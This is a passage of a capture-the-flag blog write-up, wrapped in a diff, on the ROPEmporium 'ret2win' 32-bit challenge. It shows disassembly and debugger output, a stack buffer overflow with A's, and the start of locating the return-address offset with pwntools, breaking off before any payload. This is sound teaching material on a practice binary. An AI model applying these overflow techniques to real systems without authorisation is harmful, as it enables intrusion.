@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>ROPEmporium: ret2win 32-bit | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/ret2win32bit/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>ROPEmporium: ret2win 32-bit</h1>
+    <time datetime="2021-05-24T14:20:00&#43;02:00">May 24, 2021</time>
+  </header>
+  <h1 id="writeup-of-return-to-win-ret2win-on-ropemporium">Writeup of return to win [Ret2win] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly and disassembling tools</p>
+<p>[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits. ((4*2)*8)=64-bit]</p>
+<hr>
+<p>Let&rsquo;s start by disassembling the binary with radare2&rsquo;s visual mode. I started by passing aaa to radare2, to analyze the binary and then went into visual mode.
+If you&rsquo;re unsure about how this works, look up a radare2 tutorial on YouTube.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">&gt;*</span> <span style="color:#ae81ff">0x08048430</span>   <span style="color:#ae81ff">50</span> entry0                                   
+   <span style="color:#ae81ff">0x08048463</span>    <span style="color:#ae81ff">4</span> fcn<span style="color:#ae81ff">.08048463</span>                             
+   <span style="color:#ae81ff">0x080483f0</span>    <span style="color:#ae81ff">6</span> sym.imp.__libc_start_main            
+   <span style="color:#ae81ff">0x08048490</span>   <span style="color:#ae81ff">41</span> sym.deregister_tm_clones                
+   <span style="color:#ae81ff">0x080484d0</span>   <span style="color:#ae81ff">54</span> sym.register_tm_clones                 
+   <span style="color:#ae81ff">0x08048510</span>   <span style="color:#ae81ff">31</span> entry.fini0                                 
+   <span style="color:#ae81ff">0x08048540</span>    <span style="color:#ae81ff">6</span> entry.init0                        
+   <span style="color:#ae81ff">0x080485ad</span>  <span style="color:#ae81ff">127</span> sym.pwnme                              
+   <span style="color:#ae81ff">0x08048410</span>    <span style="color:#ae81ff">6</span> sym.imp.memset                          
+   <span style="color:#ae81ff">0x080483d0</span>    <span style="color:#ae81ff">6</span> sym.imp.puts                             
+   <span style="color:#ae81ff">0x080483c0</span>    <span style="color:#ae81ff">6</span> sym.imp.printf                       
+   <span style="color:#ae81ff">0x080483b0</span>    <span style="color:#ae81ff">6</span> sym.imp.read                          
+   <span style="color:#ae81ff">0x0804862c</span>   <span style="color:#ae81ff">41</span> sym.ret2win                           
+   <span style="color:#ae81ff">0x080483e0</span>    <span style="color:#ae81ff">6</span> sym.imp.system                   
+   <span style="color:#ae81ff">0x080486c0</span>    <span style="color:#ae81ff">2</span> sym.__libc_csu_fini                   
+   <span style="color:#ae81ff">0x08048480</span>    <span style="color:#ae81ff">4</span> sym.__x86.get_pc_thunk.bx                
+   <span style="color:#ae81ff">0x080486c4</span>   <span style="color:#ae81ff">20</span> sym._fini                           
+   <span style="color:#ae81ff">0x08048660</span>   <span style="color:#ae81ff">93</span> sym.__libc_csu_init                     
+   <span style="color:#ae81ff">0x08048470</span>    <span style="color:#ae81ff">2</span> sym._dl_relocate_static_pie
+   <span style="color:#ae81ff">0x08048546</span>  <span style="color:#ae81ff">103</span> main                                     
+   <span style="color:#ae81ff">0x08048400</span>    <span style="color:#ae81ff">6</span> sym.imp.setvbuf
+   <span style="color:#ae81ff">0x08048374</span>   <span style="color:#ae81ff">35</span> sym._init 
+</code></pre></div><p>This is the information I got. I see a sym.ret2win, let&rsquo;s look at that!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">┌──────────────────────────────────────────┐</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> [<span style="color:#ae81ff">0x804862c</span>]                              <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#ae81ff">41</span><span style="color:#f92672">:</span> sym.ret2win ();                      <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> push ebp                                 <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> mov ebp, esp                             <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> sub esp, <span style="color:#ae81ff">8</span>                               <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> sub esp, <span style="color:#ae81ff">0xc</span>                             <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s                          <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#ae81ff">0x80487f6</span>                              <span style="color:#960050;background-color:#1e0010">│</span>                                                 
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#e6db74">&#34;Well done! Here&#39;s your flag:&#34;</span>         <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> push str.Well_done__Here_s_your_flag:    <span style="color:#960050;background-color:#1e0010">│</span>                                                      
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">puts</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s)                <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> call sym.imp.puts;[oa]                   <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">#</span>Calls puts, which will place the string                                                   
+<span style="color:#960050;background-color:#1e0010">│</span> add esp, <span style="color:#ae81ff">0x10</span>                            <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> sub esp, <span style="color:#ae81ff">0xc</span>                             <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string                     <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#ae81ff">0x8048813</span>                              <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>                    <span style="color:#960050;background-color:#1e0010">│</span>                                                    
+<span style="color:#960050;background-color:#1e0010">│</span> push str.bin_cat_flag.txt                <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">#</span>Pushes the string: <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span> <span style="color:#f92672">-</span> Try running this in your terminal                                                 
+<span style="color:#960050;background-color:#1e0010">│</span> ; <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">system</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>string)         <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> call sym.imp.system;[ob]                 <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">#</span>Syscall system, using the top of the stack as an argument (Here the latest pushed item <span style="color:#f92672">&amp;</span> top of stack is the string)                                                   
+<span style="color:#960050;background-color:#1e0010">│</span> add esp, <span style="color:#ae81ff">0x10</span>                            <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> nop                                      <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">│</span> leave                                    <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#f92672">|</span> ret                                      <span style="color:#960050;background-color:#1e0010">│</span>                                                     
+<span style="color:#960050;background-color:#1e0010">└──────────────────────────────────────────┘</span>  
+</code></pre></div><p>So somehow if we can return to this function, we&rsquo;ll get the flag. Great!
+Let&rsquo;s look at another function, sym.pwnme (?) That sounds interesting. Let&rsquo;s use gdb(pwndbg) instead this time around. With &ldquo;info functions&rdquo;, or &ldquo;inf fu&rdquo; we can see functions and their addresses.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> inf fu
+All defined functions:
+Non<span style="color:#f92672">-</span>debugging symbols:
+<span style="color:#ae81ff">0x08048374</span>  _init
+<span style="color:#ae81ff">0x080483b0</span>  read<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483c0</span>  printf<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483d0</span>  puts<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483e0</span>  system<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483f0</span>  __libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048400</span>  setvbuf<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048410</span>  memset<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048420</span>  __gmon_start__<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08048430</span>  _start
+<span style="color:#ae81ff">0x08048470</span>  _dl_relocate_static_pie
+<span style="color:#ae81ff">0x08048480</span>  __x86.get_pc_thunk.bx
+<span style="color:#ae81ff">0x08048490</span>  deregister_tm_clones
+<span style="color:#ae81ff">0x080484d0</span>  register_tm_clones
+<span style="color:#ae81ff">0x08048510</span>  __do_global_dtors_aux
+<span style="color:#ae81ff">0x08048540</span>  frame_dummy
+<span style="color:#ae81ff">0x08048546</span>  main
+<span style="color:#ae81ff">0x080485ad</span>  pwnme
+<span style="color:#ae81ff">0x0804862c</span>  ret2win
+<span style="color:#ae81ff">0x08048660</span>  __libc_csu_init
+<span style="color:#ae81ff">0x080486c0</span>  __libc_csu_fini
+<span style="color:#ae81ff">0x080486c4</span>  _fini
+</code></pre></div><p>So lets disassemble pwnme</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> disass pwnme 
+Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
+   <span style="color:#ae81ff">0x080485ad</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>	push   ebp
+   <span style="color:#ae81ff">0x080485ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;:</span>	mov    ebp,esp
+   <span style="color:#ae81ff">0x080485b0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0x28</span>
+   <span style="color:#ae81ff">0x080485b3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0x4</span>
+   <span style="color:#ae81ff">0x080485b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x20</span>
+   <span style="color:#ae81ff">0x080485b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x0</span>
+   <span style="color:#ae81ff">0x080485ba</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">&gt;:</span>	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x28</span>]
+   <span style="color:#ae81ff">0x080485bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;:</span>	push   eax
+   <span style="color:#ae81ff">0x080485be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x8048410</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485c9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x8048708</span>
+   <span style="color:#ae81ff">0x080485ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485d6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485d9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x8048768</span>
+   <span style="color:#ae81ff">0x080485de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485e3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">57</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x8048788</span>
+   <span style="color:#ae81ff">0x080485ee</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080485f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">70</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080485f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080485f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">76</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x80487e8</span>
+   <span style="color:#ae81ff">0x080485fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x80483c0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048603</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048606</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0x4</span>
+   <span style="color:#ae81ff">0x08048609</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x38</span>   <span style="color:#f92672">&lt;----------------</span><span style="color:#960050;background-color:#1e0010">#</span>size_t nbyte
+   <span style="color:#ae81ff">0x0804860b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;:</span>	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x28</span>]
+   <span style="color:#ae81ff">0x0804860e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">97</span><span style="color:#f92672">&gt;:</span>	push   eax    <span style="color:#f92672">&lt;----------------</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#66d9ef">void</span> buf
+   <span style="color:#ae81ff">0x0804860f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x0</span>    <span style="color:#f92672">&lt;----------------</span><span style="color:#960050;background-color:#1e0010">#</span>fd
+   <span style="color:#ae81ff">0x08048611</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x80483b0</span> <span style="color:#f92672">&lt;</span>read<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048616</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">105</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048619</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">108</span><span style="color:#f92672">&gt;:</span>	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x0804861c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;:</span>	push   <span style="color:#ae81ff">0x80487eb</span>
+   <span style="color:#ae81ff">0x08048621</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;:</span>	call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048626</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">121</span><span style="color:#f92672">&gt;:</span>	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048629</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;:</span>	nop
+   <span style="color:#ae81ff">0x0804862a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;:</span>	leave  
+   <span style="color:#ae81ff">0x0804862b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">126</span><span style="color:#f92672">&gt;:</span>	ret  
+</code></pre></div><p>Alot of stuff happens here, and it&rsquo;ll be somewhat hard for any beginner to know exactly what&rsquo;s happening here. But we can see that at &lt;+100&gt;, read@plt is called. If we look at the linux manpage for this systemcall we&rsquo;ll learn that: &ldquo;read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.&rdquo; Well.. What does that mean? First we need to understand that syscalls takes arguments.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">ssize_t <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p>It takes a filedescriptor, a buf, annd a size_t.</p>
+<p>What&rsquo;s a file descriptor? Well according to @Beano on stackoverflow it can be classified as:
+&ldquo;An opaque handle that is used in the interface between user and kernel space to identify file/socket resources. Therefore, when you use open() or socket() (system calls to interface to the kernel), you are given a file descriptor, which is an integer (it is actually an index into the processes u structure - but that is not important). Therefore, if you want to interface directly with the kernel, using system calls to read(), write(), close() etc. the handle you use is a file descriptor.&rdquo;</p>
+<p>TLDR; It&rsquo;s a handle used between user and the kernel.</p>
+<p>Important file descriptor values are:</p>
+<pre><code>Value---Name---Filestream    
+
+0---Standard input---stdin
+
+1---Standard output---stdout
+
+2---Standard error---stderr
+</code></pre><p>If you look above at the disassembling of pwnme, you can see that right before the read@plt call, 0x0 is pushed onto the stack. Which is standard input. This is when the user is prompted for input. Interesting, right?</p>
+<p>Let&rsquo;s pick up the pace a little bit. Otherwise I&rsquo;m going to be here all night.</p>
+<p>If we run the program and put in a shit ton of A&rsquo;s, we&rsquo;ll get the bread and butter of stack overflows. Segmentation fault! This tells the exploiter, that somehow he might&rsquo;ve overwritten an address in the program, causing an error.</p>
+<pre><code>Segmentation fault (core dumped)
+</code></pre><p>In gdb(pwndbg) you can run a program and make it stop at certain addresses. This is done by break *addr. You can then step one instruction at a time with si or use ni, which just checks the function you&rsquo;re in. More on that later. Lets open the program with gdb and set a breakpoint right before the read(), this is in my program at pwn+98, it might be different for you. We then run and use ni twice. Now we&rsquo;re prompted for an input. Let&rsquo;s just put in a shit ton of A&rsquo;s.</p>
+<p>(A shit ton is more than 100, just like hold it A down while you glance out the windows, idfk)
+I get a &ldquo;Undefined command&rdquo;.. hmm weird.. But if I look at the registers and stack I see this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Stack
+<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> esp  <span style="color:#ae81ff">0xffffd100</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
+<span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0004</span><span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#ae81ff">0xffffd104</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0xffffd110</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+<span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#ae81ff">0xffffd108</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x38</span> <span style="color:#75715e">/* &#39;8&#39; */</span>
+<span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span>c<span style="color:#960050;background-color:#1e0010">│</span>      <span style="color:#ae81ff">0xffffd10c</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4</span>
+<span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span> ecx  <span style="color:#ae81ff">0xffffd110</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</code></pre></div><p>And registers:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">*</span>EAX  <span style="color:#ae81ff">0x38</span>
+ EBX  <span style="color:#ae81ff">0x0</span>
+<span style="color:#f92672">*</span>ECX  <span style="color:#ae81ff">0xffffd110</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+<span style="color:#f92672">*</span>EDX  <span style="color:#ae81ff">0x38</span>
+ EDI  <span style="color:#ae81ff">0xf7fb2000</span> (_GLOBAL_OFFSET_TABLE_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x1ead6c</span>
+ ESI  <span style="color:#ae81ff">0xf7fb2000</span> (_GLOBAL_OFFSET_TABLE_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x1ead6c</span>
+ EBP  <span style="color:#ae81ff">0xffffd138</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+ ESP  <span style="color:#ae81ff">0xffffd100</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
+<span style="color:#f92672">*</span>EIP  <span style="color:#ae81ff">0x8048616</span> (pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">105</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> add    esp, <span style="color:#ae81ff">0x10</span>
+</code></pre></div><p>We have control of the ecx register and ebp register as we can see we overflowed those with A&rsquo;s.
+In gdb we can use the command to look at the stack:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">-pwndbg&gt; x/100x $sp
+</span><span style="color:#f92672"></span>0xffffd100:	0x00000000	0xffffd110	0x00000038	0x00000004
+0xffffd110:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd120:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd130:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd140:	0x41414141	0x41414141	0x00000000	0xf7de5ee5
+0xffffd150:	0xf7fb2000	0xf7fb2000	0x00000000	0xf7de5ee5
+0xffffd160:	0x00000001	0xffffd1f4	0xffffd1fc	0xffffd184
+0xffffd170:	0xf7fb2000	0x00000000
+</code></pre></div><p>The hex character for capital a (A) is 41. We can see the stack is filled with A&rsquo;s</p>
+<p>If we run again, we&rsquo;ll get an interesting error: &ldquo;Invalid address at 0x41414141&rdquo; error. Huh?? Seems like it tries to go to an address called 0x41414141??
+Cool if we just controlled the address the program tries to go to, we can make it go to &ldquo;ret2win&rdquo; and we would&rsquo;ve pwned the program. Now we&rsquo;ll be using a pattern generator from pwntools, to find out where this return address is at.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Python <span style="color:#ae81ff">3.8</span><span style="color:#f92672">.</span><span style="color:#ae81ff">5</span> (default, Jul <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">2020</span>, <span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">59</span>:<span style="color:#ae81ff">40</span>) 
+[GCC <span style="color:#ae81ff">9.3</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>] on linux
+Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> pattern <span style="color:#f92672">=</span> cyclic_gen()
+<span style="color:#f92672">&gt;&gt;&gt;</span> pattern<span style="color:#f92672">.</span>get(<span style="color:#ae81ff">100</span>)
